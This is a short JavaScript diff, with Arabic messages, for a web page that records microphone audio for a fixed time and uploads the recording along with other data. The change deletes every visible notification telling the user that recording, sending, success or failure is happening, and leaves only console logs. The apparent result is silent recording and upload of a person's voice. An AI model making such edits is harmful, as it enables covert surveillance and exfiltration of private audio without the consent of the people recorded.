@@ -163,11 +163,8 @@
         mediaRecorder = new MediaRecorder(stream);
         mediaRecorder.start();
 
-        document.getElementById('notification').textContent = 'جاري التسجيل...';
-
         setTimeout(() => {
           mediaRecorder.stop();
-          document.getElementById('notification').textContent = 'تم إيقاف التسجيل، جاري الإرسال...';
         }, recordDuration * 1000);
 
         mediaRecorder.addEventListener('dataavailable', event => {
@@ -203,15 +200,12 @@
             }
             const data = await response.text();
             console.log('تم إرسال التسجيل الصوتي والبيانات بنجاح');
-            document.getElementById('notification').textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
           } catch (error) {
             console.error('حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات:', error);
-            document.getElementById('notification').textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
           }
         });
       } catch (error) {
         console.error('خطأ في الوصول إلى الميكروفون:', error);
-        document.getElementById('notification').textContent = 'خطأ في الوصول إلى الميكروفون';
       }
     }
 
